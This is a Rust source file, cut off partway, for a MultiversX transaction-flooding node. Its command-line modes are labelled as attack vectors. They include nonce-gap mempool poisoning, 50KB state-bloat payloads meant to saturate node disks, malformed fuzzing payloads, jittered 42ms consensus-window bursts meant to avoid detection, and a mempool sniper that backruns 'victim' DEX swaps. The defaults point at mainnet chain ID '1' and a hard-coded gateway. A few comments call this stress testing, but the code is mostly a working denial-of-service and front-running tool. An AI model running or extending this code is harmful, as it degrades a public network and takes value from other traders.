
mod wallet;
mod transaction;
mod network;
mod tui;
pub mod mempool_sniper;
pub mod ws_sniper;
pub mod pcit;

use wallet::KeeperWallet;
use transaction::Transaction;
use network::MultiversXNetwork;
use tui::{run_dashboard, AppStats};

use std::sync::{Arc, atomic::{AtomicU64, Ordering}};
use std::time::Duration;
use tokio::time::sleep;
use tokio::sync::mpsc;
use rand::Rng;
use clap::{Parser, ValueEnum};

#[derive(Parser, Debug)]
#[command(author, version, about = "XCron Keeper Protocol Multi-Role Node", long_about = None)]
pub struct Cli {
    /// The attack or operation mode to execute
    #[arg(short, long, value_enum)]
    pub mode: AttackMode,

    /// Number of concurrent background broadcasters (HTTP Network Threads)
    #[arg(long, default_value_t = 2000)]
    pub broadcasters: usize,

    /// Sleep interval between Snipe attacks in seconds
    #[arg(long, default_value_t = 1)]
    pub snipe_interval_sec: u64,

    /// Target kill zone duration in ms (the 42ms window)
    #[arg(long, default_value_t = 42)]
    pub snipe_window_ms: u64,

    /// Target TPS per worker for PreWarm mode
    #[arg(long, default_value_t = 100)]
    pub tps: u32,
    
    /// Target Contract Address (Bech32) to schedule against
    #[arg(long, default_value = "erd1qqqqqqqqqqqqqpgqjq6g52c9dxy7vtckspndqxhqmm0mmken7k8sahvvd5")]
    pub target_contract: String,

    /// Max number of wallets to use (0 = all)
    #[arg(long, default_value_t = 0)]
    pub wallets: usize,

    /// Mixed attack mode: injects +5 nonce gaps (RAM poisoning) alongside valid TPS
    #[arg(long, default_value_t = false)]
    pub mixed_attack: bool,

    /// Gateway/API URL to target (default: dedicated German VPS)
    #[arg(long, default_value = "http://5.189.152.86:8080")]
    pub gateway: String,

    /// Chain ID (D=Devnet/BoN, 1=Mainnet, T=Testnet)
    #[arg(long, default_value = "1")]
    pub chain_id: String,

    /// Path to a specific Hydra JSON or PEM file
    #[arg(long)]
    pub wallets_file: Option<String>,

    /// Only load wallets belonging to a specific Shard ID (0, 1, or 2)
    #[arg(long)]
    pub target_shard: Option<u8>,

    /// Target DEX Pair Address for the Mempool Sniper (Default: Devnet WEGLD/USDC)
    #[arg(long, default_value = "erd1qqqqqqqqqqqqqpgqeel2kumf0r8ffyhth7pqdujjat9nx0862jpsg2pqaq")]
    pub dex_pair: String,
}

#[derive(Debug, Clone, Copy, PartialEq, ValueEnum)]
pub enum AttackMode {
    /// Maniobra A: Inundar con carga pre-calculada para quemar RAM poco a poco.
    PreWarm,
    /// Maniobra B: Micro-Bursting de silencio absoluto y ráfagas letales en la ventana PBFT.
    Snipe,
    /// The Devnet Load Tester: floods network with valid scheduleTask payloads
    Stress,
    /// Round-Robin Keeper competition mode
    MultiKeeper,
    /// Protocol Integrity: Mandar payloads y firmas deformadas a la red
    Fuzz,
    /// BoN Window A: Intra-Shard MoveBalance
    IntraShard,
    /// Fund Hydra Wallets with 1 EGLD each
    FundHydra,
    /// Wrap EGLD to WEGLD strictly using 5M Gas
    WrapEgld,
    /// Window B: DEX Swaps locally (15M Gas)
    DexSwap,
    /// Vector Alpha (Boomerang): Cross-Shard Routing Congestion
    CrossShard,
    /// Window D: Relayed Cross-Shard MoveBalance
    RelayedCrossShard,
    /// Window E: Relayed DEX SC Calls
    RelayedDex,
    /// Native Protocol Bottleneck (5k Creators vs 5k Keepers)
    XcronSwarm,
    /// Vector Zeta: Account State Dusting (Trie Expansion)
    Zeta,
    /// Vector Theta: Cross-Shard Receipt Header Bloat
    Theta,
    /// Vector Epsilon: VM Argument Parser & Depth Exhaustion
    Epsilon,
    /// Vector Delta: Event Log Saturation
    Delta,
    /// XCron Boundary: Fire scheduleTask/executeTask at block close/open edges
    XcronBoundary,
    /// Supernova Vector 1: State Desync (Consensus decoupling)
    StateDesync,
    /// Supernova Vector 2: EIE Overflow (Backpressure / throughput)
    EieOverflow,
    /// Supernova Vector 3: Nonce Desync V2 (Relayed Tx + async exec)
    NonceDesyncV2,
    /// Supernova Vector 4: BLS Signature Desync (Asymmetric CPU Exhaustion)
    BlsDesync,
    /// Supernova Vector 5: Cross-Shard Orphan Flooding (RAM Exhaustion)
    OrphanFlooding,
    /// Supernova Vector Surgical: MEV Backrunner + Gas Refund Hijack (Zero-Day POC)
    SurgicalBackrun,
    /// High TPS Public Demonstration Mode for BoN
    TpsDemo,
    /// Professional Flash Arbitrage Engine relying on ws_sniper
    ArbitrageHft,
    /// Demonstrates off-chain Merkle execution for Pre-Cognitive Intents
    PcitDemo,
}

fn generate_schedule_payload() -> Vec<u8> {
    let target_addr_hex = "00000000000000000500ebaa4de200cf54fe97a0604c759cd8f6de251daeb90b";
    let endpoint_hex = hex::encode("ping");
    let trigger_time = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() + 30;
    let trigger_hex = format!("00{:016x}", trigger_time);
    let task_id_hex = format!("{:016x}", 40_000_000);
    let retries_hex = "02";
    let ttl_hex = format!("{:016x}", 604800);
    // 50KB State Bloat Padding
    let padding_50kb = "00".repeat(25_000);
    let data_str = format!("scheduleTask@{target_addr_hex}@{endpoint_hex}@00000000@{trigger_hex}@{task_id_hex}@{retries_hex}@{ttl_hex}@{padding_50kb}");
    data_str.into_bytes()
}

/// Lightweight valid EGLD transfer - costs only 50,000 gas, no payload
/// Used in MIX mode for the 70% valid traffic pattern
fn generate_lightweight_payload() -> Option<Vec<u8>> {
    // Simple ping call with no bloat - legitimate network activity
    Some(b"ping".to_vec())
}

fn generate_fuzzing_payload() -> Vec<u8> {
    // Malformed cross-shard triggers for protocol integrity testing
    let variant: u8 = rand::random::<u8>() % 4;
    match variant {
        0 => b"executeTask@FFFFFFFFFFFFFFFFFFFF".to_vec(),
        1 => b"scheduleTask@0000000000000000000000000000000000000000000000000000000000000000@@@@@".to_vec(),
        2 => format!("scheduleTask@{}", "FF".repeat(500)).into_bytes(), // Oversized args
        _ => b"\x00\x01\x02\x03\xff\xfe\xfd".to_vec(), // Raw binary garbage
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();
    
    println!("🔥 XCron Protocol Multi-Role Node Starting...");
    println!("⚔️  Mode Selected: {:?}", cli.mode);
    println!("⚙️  Broadcasters: {}", cli.broadcasters);

    println!("🌐 Gateway: {}", cli.gateway);
    println!("🔗 Chain ID: {}", cli.chain_id);
    let network = Arc::new(MultiversXNetwork::new(&cli.gateway));
    let stats = Arc::new(AppStats::new());
    
    // 1. Load the Cryptographic Arsenal
    let mut wallets = Vec::new();
    // Fallback logic for wallet paths during development if hydra-keys is missing
    let actual_path_buf;
    let actual_path = if let Some(path) = &cli.wallets_file {
        actual_path_buf = path.clone();
        actual_path_buf.as_str()
    } else if std::path::Path::new("./.secrets/hydra-keys.json").exists() {
        "./.secrets/hydra-keys.json"
    } else if std::path::Path::new("../.secrets/hydra-keys.json").exists() {
        "../.secrets/hydra-keys.json"
    } else if std::path::Path::new("./.secrets/wallet.pem").exists() {
        "./.secrets/wallet.pem"
    } else {
        "../.secrets/wallet.pem"
    };

    if actual_path.ends_with(".pem") {
        if let Ok(w) = KeeperWallet::load_pem(actual_path) {
            println!("Loaded 1 PEM wallet from {}", actual_path);
            wallets.push(Arc::new(w));
        } else {
            return Err(format!("Failed to load wallet from {}", actual_path).into());
        }
    } else {
        match KeeperWallet::load_hydra_json(actual_path) {
            Ok(loaded) => {
                let initial_count = loaded.len();
                let mut accepted = 0;
                for w in loaded {
                    if let Some(shard) = cli.target_shard {
                        if KeeperWallet::get_shard(&w.bech32_address, 3) != shard {
                            continue; // Skip wallets belonging to other shards
                        }
                    }
                    wallets.push(Arc::new(w));
                    accepted += 1;
                }
                println!("Loaded {} Hydra wallets from JSON (Filtered by Shard: {}).", accepted, initial_count);
            },
            Err(e) => {
                eprintln!("Failed to load hydra JSON from {}: {}", actual_path, e);
                return Err(e.into());
            }
        }
    }
    
    if wallets.is_empty() {
        return Err("No wallets found. Cannot attack without weapons.".into());
    }

    // Limit wallets if --wallets flag is set
    if cli.wallets > 0 && cli.wallets < wallets.len() {
        wallets.truncate(cli.wallets);
        println!("🎯 Using {} wallets (limited by --wallets flag)", wallets.len());
    }

    if cli.mode == AttackMode::ArbitrageHft {
        wallets.truncate(1);
        println!("🦅 [xCron HFT] Usando solo 1 Master Wallet. Omitiendo sincronización de 10.000 carteras.");
    }

    // 2. Setup Nonces — fetch real nonces for ALL active wallets
    let mut shared_nonces = Vec::with_capacity(wallets.len());
    println!("📡 Fetching real nonces for {} wallets...", wallets.len());
    for (i, wallet) in wallets.iter().enumerate() {
        let initial_nonce = match network.fetch_nonce(&wallet.bech32_address).await {
            Ok(n) => {
                if i < 5 { 
                    let short_addr = if wallet.bech32_address.len() > 20 { &wallet.bech32_address[..20] } else { &wallet.bech32_address };
                    println!("  [{}] {} → nonce={}", i, short_addr, n); 
                }
                n
            },
            Err(e) => {
                if i < 5 { 
                    let short_addr = if wallet.bech32_address.len() > 20 { &wallet.bech32_address[..20] } else { &wallet.bech32_address };
                    println!("  [{}] {} → FAIL: {}", i, short_addr, e); 
                }
                0
            },
        };
        shared_nonces.push(Arc::new(AtomicU64::new(initial_nonce)));
        // Rate limit: 20ms between requests to avoid API throttling
        if i % 50 == 49 {
            println!("   ...{}/{} nonces fetched", i + 1, wallets.len());
            sleep(Duration::from_millis(100)).await;
        }
    }
    println!("✅ All {} nonces loaded. Ready to fire.", wallets.len());

    let num_wallets = wallets.len() as u64;
    stats.active_workers.store(num_wallets, Ordering::Relaxed);

    // 3. UI Dashboard Thread (DISABLED FOR HEADLESS SERVER)
    // let dashboard_stats = Arc::clone(&stats);
    // let ui_handle = tokio::spawn(async move {
    //     run_dashboard(dashboard_stats).await.unwrap_or(());
    // });


    // 3.5. Web Dashboard Thread (Sauron's Eye Remote)
    let web_stats = Arc::clone(&stats);
    tokio::spawn(async move {
        use tokio::net::TcpListener;
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        
        if let Ok(listener) = TcpListener::bind("0.0.0.0:9090").await {
            loop {
                if let Ok((mut socket, _)) = listener.accept().await {
                    let stats_clone = Arc::clone(&web_stats);
                    tokio::spawn(async move {
                        let mut buf = [0; 1024];
                        if let Ok(n) = socket.read(&mut buf).await {
                            if n == 0 { return; }
                            let request = String::from_utf8_lossy(&buf[..n]);
                            
                            if request.starts_with("GET /metrics") {
                                let sent = stats_clone.total_tx_sent.load(Ordering::Relaxed);
                                let errs = stats_clone.total_errors.load(Ordering::Relaxed);
                                let response = format!("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\n\r\n{{\"sent\": {}, \"errors\": {}}}", sent, errs);
                                let _ = socket.write_all(response.as_bytes()).await;
                            } else {
                                let html = include_str!("dashboard.html");
                                let response = format!("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{}", html);
                                let _ = socket.write_all(response.as_bytes()).await;
                            }
                        }
                    });
                }
            }
        }
    });

    // THE KITCHEN ARCHITECTURE (Direct Broadcasting)
    // We removed the MPSC channels because Mutex contention across 2500 broadcasters
    // completely starved the Tokio executor at 50,000 TPS.
    // Transctions are now broadcast directly from the wallet loops below.
    let mut handles = vec![];

    if cli.mode == AttackMode::FundHydra {
        println!("💸 FUNDING HYDRA WALLETS MODE ENGAGED 💸");
        let parent = KeeperWallet::load_pem(if std::path::Path::new("./.secrets/wallet.pem").exists() { "./.secrets/wallet.pem" } else { "../.secrets/wallet.pem" }).expect("needs wallet.pem");
        let mut parent_nonce = network.fetch_nonce(&parent.bech32_address).await.unwrap_or(0);
        let mut f_handles = vec![];
        
        for w in wallets.iter() {
            // Sends 0.20 xEGLD (200,000,000,000,000,000 attoEGLD)
            let mut tx = Transaction::new(parent_nonce, "200000000000000000", &w.bech32_address, &parent.bech32_address, 1_000_000_000, 50_000, None, &cli.chain_id, 1);
            tx.sign(&parent.signing_key).unwrap();
            
            let net_clone = Arc::clone(&network);
            let target = w.bech32_address.clone();
            
            f_handles.push(tokio::spawn(async move {
                match net_clone.broadcast_tx(&tx).await {
                    Ok(hash) => println!("✅ Funded {} -> {}", target, hash),
                    Err(e) => println!("❌ Failed to fund {}: {}", target, e),
                }
            }));
            parent_nonce += 1;
            sleep(Duration::from_millis(15)).await;
        }
        futures::future::join_all(f_handles).await;
        return Ok(());
    }

    let all_addresses: Vec<String> = wallets.iter().map(|w| w.bech32_address.clone()).collect();
    let shared_addresses = Arc::new(all_addresses);

    // --- PRODUCERS (The Waiters taking orders) ---
    // The Surgical Sniper Watch Channel
    let (sniper_tx, sniper_rx) = tokio::sync::watch::channel(None::<mempool_sniper::VictimDetected>);
    if cli.mode == AttackMode::SurgicalBackrun {
        let obs_url = cli.gateway.clone();
        let target_dex = cli.dex_pair.clone();
        let sniper_tx_clone = sniper_tx.clone();
        tokio::spawn(async move {
            let (mpsc_tx, mut mpsc_rx) = tokio::sync::mpsc::channel(100);
            tokio::spawn(mempool_sniper::start_mempool_sniper(obs_url, target_dex, mpsc_tx));
            while let Some(victim) = mpsc_rx.recv().await {
                // Broadcast victim to all waiters
                let _ = sniper_tx_clone.send(Some(victim));
            }
        });
    }

    // The HFT Arbitrage Watch Channel
    let (arb_tx, arb_rx) = tokio::sync::watch::channel(None::<ws_sniper::ArbitrageOpportunity>);
    if cli.mode == AttackMode::ArbitrageHft {
        let obs_url = "ws://5.189.152.86:8080/mempool".to_string(); // Tu VPS
        let target_dexes: std::collections::HashSet<String> = vec![
            "erd1qqqqqqqqqqqqqpgqeel2kumf0r8ffyhth7pqdujjat9nx0862jpsg2pqaq".to_string(), // xExchange WEGLD/USDC
            "erd1qqqqqqqqqqqqqpgqj5zftf3ef3gqm3gklfcqtzyqrnpwvvu978ssqd0sds".to_string(), // AshSwap (Ejemplo)
            "erd1qqqqqqqqqqqqqpgq0c3a2j7r0lyedq20m0w6wclswqnd7r080n4spw02u2".to_string(), // OneDex (Ejemplo)
        ].into_iter().collect();

        let arb_tx_clone = arb_tx.clone();
        tokio::spawn(async move {
            let (mpsc_tx, mut mpsc_rx) = tokio::sync::mpsc::channel(100);
            tokio::spawn(ws_sniper::start_websocket_sniper(obs_url, target_dexes, mpsc_tx));
            while let Some(opp) = mpsc_rx.recv().await {
                // Notificar a todos los hilos Keeper la oportunidad de arbitraje
                let _ = arb_tx_clone.send(Some(opp));
            }
        });
    }

    let shared_burst_interval = Arc::new(AtomicU64::new(cli.snipe_interval_sec));
    let num_active_wallets = wallets.len() as u64;

    for i in 0..wallets.len() {
        let sniper_rx_clone = sniper_rx.clone();
        let arb_rx_clone = arb_rx.clone();
        let wallet_clone = Arc::clone(&wallets[i]);
        let nonce_clone = Arc::clone(&shared_nonces[i]);
        let network_clone = Arc::clone(&network);
        let stats_clone = Arc::clone(&stats);
        let mode_clone = cli.mode.clone();
        let shared_burst_interval_clone = Arc::clone(&shared_burst_interval);
        let base_snipe_interval = cli.snipe_interval_sec;
        let snipe_interval = cli.snipe_interval_sec;
        let snipe_window = cli.snipe_window_ms;
        let cli_tps = cli.tps;
        let mixed_attack = cli.mixed_attack;
        let chain_id_for_tx = cli.chain_id.clone();
        let shared_addresses_clone = Arc::clone(&shared_addresses);
        
        let handle = tokio::spawn(async move {
            let mut burst_start = tokio::time::Instant::now();
            
            // Stagger thread starts to prevent 500 simultaneous HTTP TLS handshakes from hanging the event loop
            tokio::time::sleep(tokio::time::Duration::from_millis(i as u64 * 3)).await;

            let mut sniper_rx = sniper_rx_clone.clone();
            let mut arb_rx = arb_rx_clone.clone();

            loop {
                match mode_clone {
                    AttackMode::TpsDemo => {
                        // TpsDemo runs completely unhinged now. Zero sleep.
                    },
                    AttackMode::PreWarm | AttackMode::Stress | AttackMode::MultiKeeper | AttackMode::Fuzz | AttackMode::IntraShard | AttackMode::FundHydra | AttackMode::WrapEgld | AttackMode::DexSwap | AttackMode::CrossShard | AttackMode::RelayedCrossShard | AttackMode::RelayedDex | AttackMode::XcronSwarm | AttackMode::Zeta | AttackMode::Theta | AttackMode::Epsilon | AttackMode::Delta | AttackMode::XcronBoundary | AttackMode::StateDesync | AttackMode::EieOverflow | AttackMode::NonceDesyncV2 | AttackMode::BlsDesync | AttackMode::OrphanFlooding | AttackMode::SurgicalBackrun | AttackMode::ArbitrageHft | AttackMode::PcitDemo => {
                        // All these modes disparan continuamente a los Gateways sin parar, 
                        // guiados solo por el TPS total configurado. (SurgicalBackrun/ArbitrageHft lo ignoran dentro de su logic)
                        if cli.mode != AttackMode::SurgicalBackrun && cli.mode != AttackMode::ArbitrageHft {
                            let delay = Duration::from_micros((1_000_000 * num_active_wallets) / cli_tps as u64);
                            sleep(delay).await;
                        }
                    },
                    AttackMode::Snipe => {
                        // El Asalto de Precisión (Snipe) y la Bomba Wasm (Epsilon) evaden P2P
                        // aplicando un Jitter Silencioso. Ningún tx sale durante minutos.
                        // Todo sale de golpe en la ventana letal de 42ms (PBFT Time)
                        let elapsed_ms = burst_start.elapsed().as_millis() as u64;
                        let current_interval = shared_burst_interval_clone.load(Ordering::Relaxed);
                        let sleep_ms = current_interval * 1000;
                        
                        if elapsed_ms < sleep_ms {
                            // 1. DURMIENDO OCULTO: Ahorrar CPU y aplicar el 'Jitter' orgánico
                            sleep(Duration::from_millis(sleep_ms - elapsed_ms)).await;
                            continue;
                        } else if elapsed_ms > sleep_ms + snipe_window {
                            // 3. SE CERRÓ LA VENTANA.
                            if i == 0 {
                                // Solo el Wallet 0 tira los dados del Jitter Orgánico para sincronizar a todo el Enjambre
                                let jitter_secs = rand::thread_rng().gen_range(-180..=180); // +/- 3 Minutos de aleatoriedad
                                let next_interval = (base_snipe_interval as i64 + jitter_secs as i64).max(60) as u64;
                                shared_burst_interval_clone.store(next_interval, Ordering::Relaxed);
                            }
                            burst_start = tokio::time::Instant::now();
                            continue;
                        }
                        // 2. DENTRO DE LA VENTANA DE 42ms -> FUEGO A DISCRECIÓN (Zero Delay)
                    }
                }

                let current_nonce = nonce_clone.load(Ordering::SeqCst);
                
                let addrs = [
                    "erd1f5t0neuse284m5r5en3hvmmevvc05yx6tqmlywjt9r7a8r4ce4vsg22y32", "erd1x4we6ryz87mmyqfsdxj6m27pd0xz725f6al9l85txgvnrpnnjpmss4esuz",
                    "erd1ayndwqfnahkrfhxuzc9wuu7tqn3jz35d2cywcjl2zyz0nd3p2pxssm34mf", "erd14h6whgpe6epv8s99654m9hkpwzehypglc7yn5p4t6gsxqpeqemeqaen2a4",
                    "erd1ysc26qentre832j4tz44q37h4ffrxg9e3agr5m6sk2n3hzwywsfs6tvqze", "erd1cwe3dwr565lqfyqw6j6u7ptq8a72ca5uuqaelwt3p6egwuw2zcuqfmdv6q",
                    "erd1dj9h4rxvuv4qmk6zkc4py4348qelghp3c37cv822hzr4hu9a36esu7mcqe", "erd10d8dg4xs6gvgrs2p5vvzvvgpz4qz04nrj8ecgfgs7ne9ctxlu6vq26xc3s",
                    "erd10q8k5sh7dh3qx606drd3rl9g0uujdqnfyx4z0hhvtt03u80x98aqur5qe5", "erd1gkk7mn67eur92s5ynxmwz7l7vf85nyx7xhmppdcmdtttjy8xa5jsgh0utp",
                    "erd1e26gu3uxsvd93549lx62vdzd3sullhalygn2qwyu2eg5m6szy30sw4lahl", "erd1wrwqkz7p03nkmc0h97ddpjahu9md505lspp7tp7vsp66msun4hmq9epppl",
                    "erd1hwayc60mqgp0zmlnvdkpp7zfhvdzmetz8f57x2zf3638rxvspnxs4sgklx", "erd1pvcvwe4p39fhz4h39ryaz8x3d8a3pwtpkdx98erdjx33gqvk335qclwh3x",
                    "erd1x486x4jcs2c4cerwrm2nxkgzzs3mj9mzr98lk3e4rzvsp6xfxd5snvh4cv", "erd1pjlzjg50py205c7sv3ylry7hnxh3mn28pxt563uapkauszjsnxuqtewz8e",
                    "erd1fjenh2exckk9u984fx75pc9vf63ez0j8tnkxz25egme033xxvjhs6qyat7", "erd1gjhzxnfht7t3d3kfkhdc0q9uwrhxfvg26plk722edy9txzmddw3sucyvj9",
                    "erd1jyaql4fq6a0rvkcpwstfzw30j0xzufwhmnde5ld3utrynufd4xpqustl5g", "erd1gg9hjwkywhekm9hhar2wu3laff8yddx0vx3xhhpnt8qjcdszmpksg5td8d",
                    "erd15h9wel0d26q69cgc4dxxgcc0eqgz73a6lqkdd0s3g4ragk9d3e7swygmps", "erd129tz27fypcrln5mf54f0260yzdf33xpkmk5v4x5v5xd69jwfypsq0s5q37",
                    "erd19au0pgc3ydfjnn2he7r2ny64talrf2x7873z32xgs3ygmgnxtdzsdvnj7p", "erd1r8wtk2samkvrlx7f6e35qzsgyhh7kskc6yed7mp8jwa87h5zd3rs3pfsna",
                    "erd14dfr86dtk8eeyp02k27fdel78cx20mk97jt6g0zw3ahxz7fw7njqujuxqr", "erd1602fdunhxnfdg9ew9pyuy00gj89vctkzpw700rw3nyj7ky7m2y8stm6c4p",
                    "erd1j5snfdn4v2u6vu9jr8nkmwgndn3evcyvr3njz70s9lg02ef0x94s7667m9", "erd1vru00wx2rfplytyfzp9tpyekh7mju8chv7wd7ls2sdtz250c2avssak7z3",
                    "erd1p98rmzzpm6z0q2an3gq3g3nm50zduknjtr65t3ql0wf2j542thgqjcw80c", "erd1hrg8fyj7y4tdflarezjp892d9fwl2mddsqqu8ljrdy3nueagz78sghgqt6",
                    "erd1dm5z5jad3ea3cunzhm64zeffu6hjy9af6ph2qd5qd75lfasfg8ysl8ku0u", "erd1r0nxct75rcle7lv736jdwx54mp9zf0jgjnf342wkdh6z6t2qjs0qyw3p5v",
                    "erd1cn6e8avg2v0s6ntlrtkzlw9qde5p004zt8r9z3hq73udz333yq3qurlrn0", "erd1saf2gpmqrv3vs0u33gh0a0tlqmuf36d00ayqgup5lemdku8vg8kq3m3mw6",
                    "erd1cfehklmj25r3dunpdt99tdng6lsdw8cmu46q78crtl4r8heeuxvs6g67td", "erd19lpz9fpxtnlaxsxye6azt9cehgyyxrqg9er8ckrwaksu0z5628lqcek4fc",
                    "erd1xvl68z0q3l85hqnhytld9356w8aseewk0rngqr99twkuprmfh8uqsd59p3", "erd1jc3fn8nvkvs96yltquymfmd925dwcnpk0yyxyy83mct6z87eyayq6uctq4",
                    "erd14xhcykawhy4kv0pcqw5seu8776se9wzdegch2djgzmy56levaw8qzgplhl", "erd1ehxulx8y25dky8ksemtcdhxgcrnstyxv7vuw2nczc7lsh8nnz0gqwelcrw",
                    "erd1v9l2fusc96eeux808hrwuwwum4wqa9zqzfq2pn7eh2kak36erqsszgha0c", "erd1xuyevy68jxyxf76r8ngl2xsa7zh606s7hs4hulh4wldznemufd9qh0aa03",
                    "erd12gcjd3qtq7u706j44dws3mewfyx66nxn8vhdhzsejyug86xg3d0sgck3y5", "erd13puxr7f7v0thezufhypt5lcy307nyf225jp67pyupyenqqhfv6msktk67p",
                    "erd15pvwch3rfj9qpz4spq7es6fhvk3lu560mk3ztstwp4lk72frl7lql55d7w", "erd1cenfq8ewh6khw5a5dygvknha990gaxcc27v22hne04g6syld0qvsm9rr6r",
                    "erd17265suxnkjuaeftjt4czq993c3ulemu9f5e9e8yg8p0dhn06hqeqwv0w4v", "erd1f7awdl5vu8sacuyhuxllren2ygpjszktz8yh37nala6ze4zy8dyq2v46c0",
                    "erd1x0gew526ep7m4sstv4lsyxlyf5n9wxfg0za92h00vn9fduleytmq3cwqmq", "erd1xpkyvz5f7ftd45vfgfevyzveut4psj96gxawvs8h5h8x5pgkll2shlpws8",
                    "erd1k0h5cmhrqksjl4ghglc4vp2hx29u660jwl46hdxtme2dtup522lqs7a29r", "erd1460jwaqduggt6xgccxphv6852hymdeq4s7lazkt5dcgpqv6clthqvm8y6e",
                    "erd1ayffp47gshar73x3pam2cuxzuuj0papz5axtqcmve85dqf8tj3tq58jket", "erd1v9va2qs9ddsp637vjmazgzyp787kee6tf8m3jdss6wuxr9s5uazqeukws4",
                    "erd12xkc8c8z2xme566lec7husug30zku5f93f8ng72awdqz7ljqkqjss4w04w", "erd1h9073yvalv0j99s4gma9zffynsvnmrug234aqejfg4l839szh6wqdqjy8q",
                    "erd1rmw0u974ccjd64etuv7uwq7wlc2lnrpcctmf38jmdpufwvgddltqdnt8j4", "erd10698hvstm54jg3j66hva6gmzmrp782llflpt5javpzl2d6dfay8qhfrg02",
                    "erd1ahqy7t4gvcpnf0jxt4gx8uy3ejtf67q24c5n0x7tkdnpt9g7zrms4rz0da", "erd14yruenkgdlwr9hnhkz8j2dp8320jgx274jv92s8mquj7twzpypgsqky0q9",
                    "erd15uknpfk0kxm09m0xygvryuye85z7ee8ukkdxytptjfrqcdt030psz2unhn", "erd1sz5ygj0hscygs06t9p0nwgyg8emgqgf6rqapvj0kjw49fjcnsdmqnp4nld",
                    "erd1w2s798ttxd99xeyw3rpkpm7p66jg5wk6plq95rtum0se70na7ahqrhntf3", "erd1pt4mejw956qay6fsgtp5suy88dwhz7ptp29dfzn33t3ww9dup4hq6yls86",
                    "erd1c4leswulgywtt0e64d9as6n596lu4nrdfrlqk2su0cc87g5qxpnsge5s4a", "erd1fsdpjxlcc9tg379zcxsvnfs9ysluxtknl4y6vgjteg4w4vrvv7gsqutp6f",
                    "erd1meeespty7q4rra0r04uelyrza2jdkd563k48ynwdvdu93a7jw8jqurm9tl", "erd189axmvs0rxsrxfkx3txggcd4rzfemcheer4xqpylfnf6qc9j0mtq663a5l",
                    "erd1a8hsnud789dra8z2dhr3xd6au656jk49hme6j6hrjtp4phwt94eqqhkf6g", "erd1npqqt9c9tnspu8mmvkuu8vntyczufkgk7l5n8j27syvz0dq02qaqjxxcn3",
                    "erd1wy399cqww7devxa42pj64hjt920ar3acrv7ruqaj0uyqpm5eydlst97yuj", "erd1wsqw8xmzhdqfdjhaqqwt7d8dhtdtc032l9nrencnkec9x4efg2aqkamfam",
                    "erd1thx3p63rp5frjmu2rkf2vym5s3hvk0rw45n0acxnz056cqqjfqjs8cm2ut", "erd1h6wpkgptergm8hefgtfpsjgkgux3hg26f6mmlr38lf6fyqssnq8su4lus4",
                    "erd1287k53e57hxh2tf467q7mxaum699druf0tvjasnwtfcdrzfpv6vqek07fn", "erd1erdn437tm6z563da7jyc6lhnz8t6rp4axff2vxj2r8tcahewpgfq05sgmj",
                    "erd1agtx4trme8tcpuy92gyf7lke3m6qwkx8k2pm95dyctelfn0jxqeq73s2rj", "erd1uk3t4vtu4rrn8l3nsdaq3zlvqzv969wgm2krz7e92phng7344dfs7hqlym",
                    "erd1ffnk9jlfnh8yahfy6f4c7f9pl0vz5phku5ge3dhe86rny2fc63tq6dr7pj", "erd1l2xn2c8mlg7m55detmqsvgajmae9rdc5m4967z6a2gn23up2552sq3uy4d",
                    "erd1sps6s94v3slhdpchmxpu2em5k4tqe0hcqqnw74xasqtc688tmfgsexk9x5", "erd1xjdhc2k26xqct4jrpf9euc4axz3rrj6u34j3jsf2ad54jfful9fspg439n",
                    "erd17t4rz8rcsalpvcms64nyrq6k730zt76xpkunp4j65gn23mynksws7en3r0", "erd1vesyhj7c067auaxp62qpdrqrxltml0ww5r65mq6anx38u4mkjz0qag8fu4",
                    "erd1cpuw8492f2qj6w23qpn0vwhgyz32c0ndvelsu8k56d7czluum6uqjs57gc", "erd1vrg0ahzzh6ukz5dyttv45xrjgg5y9vs4aj9q5j8wd6t9m6txds2skpwvas",
                    "erd1dx966rk3cd7mqr0xl7d65627efg5g7dexuvlr42stupzeysfva8qlppsq4", "erd1xp2nylneu8xsvlj6u7e9m7c3sv35v9x0za5my987elt2rr098fqq4glllu",
                    "erd1c08uv2gd242rexv7td262q0tkuld85x9z447n4u69azqug544f2s473z5e", "erd19nssta8fwtq9egf4vm2rlq4n6kwfuq4n4lm9mphc0lxje396xk2qcznftx",
                    "erd1q8sxqu2wup5z0l9u5a39kjrhmnma74szq2q64zdtra9su30286lqltvm99", "erd1288k83q5fzspzqykrjpe3k05vl844vkvtn7kp9z988qt4mwmapfqmgvmk3",
                    "erd1njhwdllgjswrsuhr0f3vkm3wyy0kt3y457y4amxnz9c75j7prg7sufm77d", "erd1j8xau59v9dljrk5dqxftue4cf5eek4vs5kw9hlcf8vnc3j73skcqrpg7sm",
                    "erd1xsxr9g6tg3586q3uucdme0yrzqd68sl438suqeydsch750cq5vts68nw83"
                ];

                // Determine Payload and Gas logic
                // MIX strategy: 95% lightweight valid txs + 5% heavy fuzzing
                let roll: u8 = rand::random::<u8>() % 100;
                
                let (payload, gas, receiver_owned, value) = match mode_clone {
                    AttackMode::Stress => {
                        // Vector Gamma: Storage IO State Bloat (Kill the NVMe Disks)
                        // By firing 50KB blocks to the state trie continuously to the same SC,
                        // we bottleneck the nodes physically on disk IO, trying to breach 6s Block Time.
                        let pl = generate_schedule_payload();
                        let target_sc = "erd1qqqqqqqqqqqqqpgqpng9zskcp3ng6pvk5gz6rx4asd2rcrvpa9kqw9aaxe".to_string(); // The actual deployed SC on BoN
                        (Some(pl), 300_000_000, target_sc, "0")
                    },
                    AttackMode::Fuzz => {
                        // Vector Beta: Mempool Orphan Poisoning ("Ghost Tx")
                        // We intentionally skip a nonce to force the Gateway to hold the subsequent valid transactions in RAM
                        // waiting for the missing sequence number. At 100 wallets * 50 TPS, this fills up the Orphan pool rapidly.
                        
                        // We do a simple valid EGLD transfer so it's accepted mathematically, but sequence-poisoned.
                        (None, 50_000, KeeperWallet::generate_random_address(), "1")
                    },
                    AttackMode::IntraShard => {
                        // Window A: MoveBalance to random challenge address in same shard
                        let rand_idx: usize = rand::random::<usize>() % shared_addresses_clone.len();
                        (None, 50_000, shared_addresses_clone[rand_idx].clone(), "1")
                    },
                    AttackMode::WrapEgld => {
                        // Window B step 1: Wrap EGLD to WEGLD using system SC
                        // Need 0.005 EGLD minimum for 1,000 swaps in total across the bot limit
                        let pl = b"wrapEgld".to_vec();
